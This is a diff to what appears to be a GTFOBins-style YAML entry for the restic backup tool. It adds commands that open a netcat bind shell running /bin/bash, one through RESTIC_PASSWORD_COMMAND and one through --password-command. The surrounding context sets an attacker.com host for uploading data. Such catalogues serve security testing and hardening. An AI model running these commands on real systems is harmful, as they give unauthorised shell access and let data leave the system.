@@ -17,6 +17,11 @@ description: |
 
   Upload data to the attacker server with the following commands.
 functions:
+  command:
+    - description: The attacker does not need to setup a server to receive the backups in this case. Command execution can be achieved through control of argv or environment, many restic subcommands support this option, so even if the attacker control only a subset of argv, command execution may still be achievable.
+      code: |
+        RESTIC_PASSWORD_COMMAND='nc -l 127.0.0.1 -p 4321 -e /bin/bash' restic backup # Through environment
+        restic backup --password-command="nc -l 127.0.0.1 -p 4321 -e /bin/bash"      # Through option
   file-upload:
     - code: |
         RHOST=attacker.com
